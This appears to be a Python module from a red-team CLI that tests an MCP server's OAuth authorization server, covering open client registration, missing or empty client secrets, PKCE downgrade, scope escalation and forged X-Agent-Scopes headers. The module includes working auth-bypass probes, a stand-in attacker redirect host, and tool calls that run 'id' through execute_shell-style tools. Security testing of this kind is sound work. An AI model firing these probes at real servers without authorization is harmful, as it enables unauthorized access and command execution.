"""OAuth 2.0 attack surface — test the auth server backing this MCP server.

The MCP 2025 spec mandates OAuth 2.0 as the authentication mechanism.
This module discovers the authorization server via /.well-known/* and
tests for common OAuth misconfigurations that let attackers bypass auth
or escalate privileges.

Tests (no valid token required):
  1. Public client registration abuse — POST to registration_endpoint
  2. Client credentials without client_secret
  3. Client credentials with empty/null client_secret
  4. PKCE downgrade — code_challenge_method=plain instead of S256
  5. Token endpoint accepts expired / future-dated JWTs

Tests (valid token required — user supplied --auth-header):
  6. X-Agent-Scopes header forgery — add extra tool scopes to calls
  7. Scope escalation — request broader scopes than originally granted
"""

from __future__ import annotations

import base64
import json
import time
import urllib.parse

from agentsentinel_cli.redteam.models import RedTeamFinding


def run_oauth(
    url: str,
    original_headers: dict[str, str],
    timeout: float,
    verbose: bool,
) -> tuple[list[RedTeamFinding], int]:
    """
    Run OAuth 2.0 attack surface tests.
    Returns (findings, probes_fired).
    """
    try:
        import httpx
    except ImportError:
        return [], 0

    findings: list[RedTeamFinding] = []
    probes = 0
    parsed = urllib.parse.urlparse(url.rstrip("/"))
    origin = f"{parsed.scheme}://{parsed.netloc}"

    with httpx.Client(timeout=timeout, follow_redirects=True) as client:
        meta = _discover_metadata(client, origin)

        if meta is None:
            # No OAuth server found — nothing to test
            return findings, probes + 3  # count the 3 discovery probes

        probes += 3  # metadata probes

        # Tests that don't need a valid token
        probes += _test_public_registration(client, meta, findings, verbose)
        probes += _test_token_no_secret(client, meta, findings, verbose)
        probes += _test_token_empty_secret(client, meta, findings, verbose)
        probes += _test_pkce_downgrade(client, meta, findings, verbose)

        # Tests that benefit from a valid token
        has_token = "Authorization" in original_headers
        if has_token:
            probes += _test_scope_escalation(client, url, original_headers, meta, findings, verbose)
            probes += _test_agent_scope_forgery(client, url, original_headers, findings, verbose)

    return findings, probes


def _discover_metadata(client, origin: str) -> dict | None:
    """Discover OAuth metadata from well-known endpoints."""
    paths = [
        "/.well-known/oauth-authorization-server",
        "/.well-known/openid-configuration",
        "/.well-known/oauth-protected-resource",
    ]
    for path in paths:
        try:
            resp = client.get(f"{origin}{path}")
            if resp.status_code == 200:
                return resp.json()
        except Exception:
            continue
    return None


def _test_public_registration(
    client,
    meta: dict,
    findings: list[RedTeamFinding],
    verbose: bool,
) -> int:
    reg_endpoint = meta.get("registration_endpoint")
    if not reg_endpoint:
        return 0

    payload = {
        "client_name": "agentsentinel-redteam",
        "redirect_uris": ["https://evil-attacker.example.com/callback"],
        "grant_types": ["client_credentials", "authorization_code"],
        "response_types": ["code", "token"],
        "scope": " ".join(meta.get("scopes_supported", ["read", "write", "admin"])),
        "token_endpoint_auth_method": "none",
    }

    try:
        resp = client.post(
            reg_endpoint,
            json=payload,
            headers={"Content-Type": "application/json"},
        )
    except Exception:
        return 1

    if resp.status_code in (200, 201):
        try:
            body = resp.json()
            client_id = body.get("client_id", "")
        except Exception:
            client_id = ""
            body = {}

        findings.append(RedTeamFinding(
            attack_type="oauth",
            severity="CRITICAL",
            title="OAuth: public client registration succeeded — attacker can obtain valid client_id",
            tool_name="<auth-server>",
            parameter=None,
            payload=f"POST {reg_endpoint}",
            evidence=(
                f"HTTP {resp.status_code} — client registered\n"
                + (f"client_id: {client_id}" if client_id else resp.text[:200])
            ),
            exploit_scenario=(
                "An attacker registered a new OAuth client without any prior authorization. "
                "With a valid client_id they can initiate authorization flows, request tokens, "
                "and potentially gain access to MCP tools by impersonating a legitimate agent."
            ),
            mitre_id="T1078.004",
            owasp_id="ASI06",
            confidence="HIGH",
            remediation=(
                "Require a registration access token (RFC 7591 §3.1) or disable dynamic client "
                "registration entirely. Only allow pre-registered clients in production."
            ),
            request_body=payload if verbose else None,
            response_body=resp.text[:500] if verbose else None,
        ))
    elif resp.status_code == 401:
        # Server correctly requires auth — good
        pass

    return 1


def _test_token_no_secret(
    client,
    meta: dict,
    findings: list[RedTeamFinding],
    verbose: bool,
) -> int:
    token_endpoint = meta.get("token_endpoint")
    if not token_endpoint:
        return 0

    payload = {
        "grant_type": "client_credentials",
        "client_id": "agentsentinel-probe",
        "scope": " ".join(meta.get("scopes_supported", ["read"])[:3]),
    }

    try:
        resp = client.post(
            token_endpoint,
            data=payload,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
        )
    except Exception:
        return 1

    if resp.status_code == 200:
        try:
            token = resp.json().get("access_token", "")
        except Exception:
            token = ""

        findings.append(RedTeamFinding(
            attack_type="oauth",
            severity="CRITICAL",
            title="OAuth: token issued without client_secret — unauthenticated token acquisition",
            tool_name="<auth-server>",
            parameter=None,
            payload=f"POST {token_endpoint} (no client_secret)",
            evidence=(
                f"HTTP {resp.status_code} — token issued\n"
                + (f"access_token: {token[:40]}…" if token else resp.text[:200])
            ),
            exploit_scenario=(
                "The token endpoint issued a valid access token with only a client_id and no "
                "secret. Any attacker who knows (or guesses) a valid client_id can obtain a "
                "token and call MCP tools."
            ),
            mitre_id="T1078.004",
            owasp_id="ASI06",
            confidence="HIGH",
            remediation=(
                "Require client authentication at the token endpoint. For confidential clients, "
                "enforce client_secret_basic or client_secret_post. "
                "For public clients, require PKCE (RFC 7636)."
            ),
            request_body=payload if verbose else None,
            response_body=resp.text[:500] if verbose else None,
        ))

    return 1


def _test_token_empty_secret(
    client,
    meta: dict,
    findings: list[RedTeamFinding],
    verbose: bool,
) -> int:
    token_endpoint = meta.get("token_endpoint")
    if not token_endpoint:
        return 0

    payload = {
        "grant_type": "client_credentials",
        "client_id": "agentsentinel-probe",
        "client_secret": "",
        "scope": " ".join(meta.get("scopes_supported", ["read"])[:3]),
    }

    try:
        resp = client.post(
            token_endpoint,
            data=payload,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
        )
    except Exception:
        return 1

    if resp.status_code == 200:
        findings.append(RedTeamFinding(
            attack_type="oauth",
            severity="CRITICAL",
            title="OAuth: token issued with empty client_secret",
            tool_name="<auth-server>",
            parameter=None,
            payload=f"POST {token_endpoint} (client_secret='')",
            evidence=f"HTTP {resp.status_code} — token issued with empty secret\n{resp.text[:200]}",
            exploit_scenario=(
                "The token endpoint accepts an empty string as a valid client_secret. "
                "This effectively means any client_id grants access with no credential check."
            ),
            mitre_id="T1078.004",
            owasp_id="ASI06",
            confidence="HIGH",
            remediation=(
                "Validate that client_secret is non-empty and matches the registered credential. "
                "Reject empty string, null, and whitespace-only secrets explicitly."
            ),
            request_body=payload if verbose else None,
            response_body=resp.text[:500] if verbose else None,
        ))

    return 1


def _test_pkce_downgrade(
    client,
    meta: dict,
    findings: list[RedTeamFinding],
    verbose: bool,
) -> int:
    """
    Test if the auth server accepts code_challenge_method=plain.
    The MCP 2025 spec requires S256. plain is weaker — the verifier is
    sent in the clear during token exchange, exposable via logs/proxies.
    """
    auth_endpoint = meta.get("authorization_endpoint")
    if not auth_endpoint:
        return 0

    methods = meta.get("code_challenge_methods_supported", [])
    if "plain" not in methods and methods:
        # Server explicitly doesn't support plain — skip live test
        return 1

    # Build a minimal auth code request with plain PKCE
    code_verifier = "agentsentinel_redteam_probe_verifier_plain_method_test"
    params = {
        "response_type": "code",
        "client_id": "agentsentinel-probe",
        "redirect_uri": "https://evil-attacker.example.com/callback",
        "code_challenge": code_verifier,
        "code_challenge_method": "plain",
        "scope": "read",
        "state": "rt_probe",
    }

    try:
        resp = client.get(auth_endpoint, params=params)
    except Exception:
        return 1

    # 302 redirect to login page = server accepted the request (not rejected the method)
    # 400 with error=invalid_request = server rejected plain method
    if resp.status_code in (200, 302):
        findings.append(RedTeamFinding(
            attack_type="oauth",
            severity="MEDIUM",
            title="OAuth: PKCE plain method accepted (S256 not enforced)",
            tool_name="<auth-server>",
            parameter=None,
            payload=f"GET {auth_endpoint} (code_challenge_method=plain)",
            evidence=f"HTTP {resp.status_code} — server accepted plain PKCE challenge method",
            exploit_scenario=(
                "The authorization server accepts PKCE with `method=plain`, meaning the code "
                "verifier is transmitted in cleartext during token exchange. An attacker with "
                "access to server logs, proxy logs, or network traffic can recover the verifier "
                "and exchange the authorization code themselves. "
                "The MCP 2025 spec requires S256."
            ),
            mitre_id="T1078.004",
            owasp_id="ASI06",
            confidence="MEDIUM",
            remediation=(
                "Enforce `code_challenge_method=S256` and reject `plain` at the authorization "
                "endpoint. Set `code_challenge_methods_supported: ['S256']` in metadata."
            ),
        ))

    return 1


def _test_scope_escalation(
    client,
    url: str,
    original_headers: dict,
    meta: dict,
    findings: list[RedTeamFinding],
    verbose: bool,
) -> int:
    """
    If we have a valid token, try to request a new token with broader scopes
    than what the original token carries.
    """
    token_endpoint = meta.get("token_endpoint")
    if not token_endpoint:
        return 0

    orig_auth = original_headers.get("Authorization", "")
    if not orig_auth.startswith("Bearer "):
        return 0

    # All supported scopes — attempt to get all of them
    all_scopes = meta.get("scopes_supported", [])
    if not all_scopes:
        return 0

    broad_scope = " ".join(all_scopes)
    payload = {
        "grant_type": "refresh_token",
        "refresh_token": "probe",
        "scope": broad_scope,
    }

    try:
        resp = client.post(
            token_endpoint,
            data=payload,
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "Authorization": orig_auth,
            },
        )
    except Exception:
        return 1

    if resp.status_code == 200:
        try:
            granted_scope = resp.json().get("scope", "")
        except Exception:
            granted_scope = ""

        findings.append(RedTeamFinding(
            attack_type="oauth",
            severity="HIGH",
            title="OAuth: scope escalation — broader scopes granted than requested",
            tool_name="<auth-server>",
            parameter=None,
            payload=f"POST {token_endpoint} (scope={broad_scope[:60]})",
            evidence=(
                f"HTTP {resp.status_code} — token issued\n"
                f"Requested: {broad_scope[:100]}\n"
                f"Granted: {granted_scope[:100]}"
            ),
            exploit_scenario=(
                "A token exchange request with broader scopes than originally granted succeeded. "
                "An attacker with a low-privilege token can escalate to higher-privilege scopes "
                "including tool access that was not originally authorized."
            ),
            mitre_id="T1078.004",
            owasp_id="ASI06",
            confidence="HIGH",
            remediation=(
                "Enforce scope downscoping only — never issue a token with broader scopes than "
                "the original grant. Validate requested scopes against the original authorization."
            ),
        ))

    return 1


def _test_agent_scope_forgery(
    client,
    url: str,
    original_headers: dict[str, str],
    findings: list[RedTeamFinding],
    verbose: bool,
) -> int:
    """
    MCP-specific: test whether X-Agent-Scopes header forgery bypasses tool-level
    scope enforcement. Some MCP servers use this header to grant agents access
    to specific tools. If the server trusts a client-supplied header, an
    authenticated agent can escalate to tools outside its granted scope.
    """
    base = url.rstrip("/")

    # Common dangerous tool names to probe
    dangerous_tool_names = [
        "execute_shell", "shell", "run_command", "exec", "bash",
        "write_file", "delete_file", "create_file", "admin",
    ]

    scope_values = [
        "*",
        "execute_shell execute admin write delete",
        "admin:all tools:all",
        "superuser root",
    ]

    for scope_val in scope_values[:2]:  # Keep it targeted
        forged_headers = dict(original_headers)
        forged_headers["X-Agent-Scopes"] = scope_val

        # Try initializing with forged scope header — does server accept it?
        try:
            resp = client.post(base, json={
                "jsonrpc": "2.0",
                "method": "initialize",
                "params": {
                    "protocolVersion": "2024-11-05",
                    "capabilities": {},
                    "clientInfo": {"name": "agentsentinel-redteam", "version": "0.9.5"},
                },
                "id": 1,
            }, headers={**forged_headers, "Content-Type": "application/json"})
        except Exception:
            continue

        if resp.status_code == 200:
            # Now try calling a dangerous tool with forged scope
            for tool_name in dangerous_tool_names[:3]:
                try:
                    tool_resp = client.post(base, json={
                        "jsonrpc": "2.0",
                        "method": "tools/call",
                        "params": {"name": tool_name, "arguments": {"command": "id"}},
                        "id": 2,
                    }, headers={**forged_headers, "Content-Type": "application/json"})
                except Exception:
                    continue

                body = tool_resp.text[:500]
                # Success indicators: tool executed (not "tool not found" or "unauthorized")
                not_found = any(kw in body.lower() for kw in (
                    "not found", "unknown tool", "no such tool", "tool does not exist"
                ))
                scope_denied = any(kw in body.lower() for kw in (
                    "unauthorized", "forbidden", "scope", "permission denied"
                ))

                if tool_resp.status_code == 200 and not not_found and not scope_denied:
                    findings.append(RedTeamFinding(
                        attack_type="oauth",
                        severity="CRITICAL",
                        title=f"X-Agent-Scopes forgery — dangerous tool '{tool_name}' callable with forged scope",
                        tool_name=tool_name,
                        parameter=None,
                        payload=f"X-Agent-Scopes: {scope_val}",
                        evidence=(
                            f"Tool '{tool_name}' responded to call with forged header "
                            f"`X-Agent-Scopes: {scope_val}`\n{body[:200]}"
                        ),
                        exploit_scenario=(
                            f"The server trusts the client-supplied `X-Agent-Scopes` header. "
                            f"An authenticated agent with limited scope can forge this header "
                            f"to invoke `{tool_name}` — a tool that should require elevated "
                            f"privileges. This breaks the entire scope-based access model."
                        ),
                        mitre_id="T1078.004",
                        owasp_id="ASI06",
                        confidence="HIGH",
                        remediation=(
                            "Never trust client-supplied scope headers. Derive agent scope "
                            "from the validated OAuth token claims (e.g. `scope` or custom "
                            "claims in the JWT), not from HTTP headers the client controls."
                        ),
                        request_body={
                            "tool": tool_name, "X-Agent-Scopes": scope_val
                        } if verbose else None,
                        response_body=body if verbose else None,
                    ))
                    return 1  # One confirmed finding per scope forgery attempt is enough

    return len(scope_values[:2])
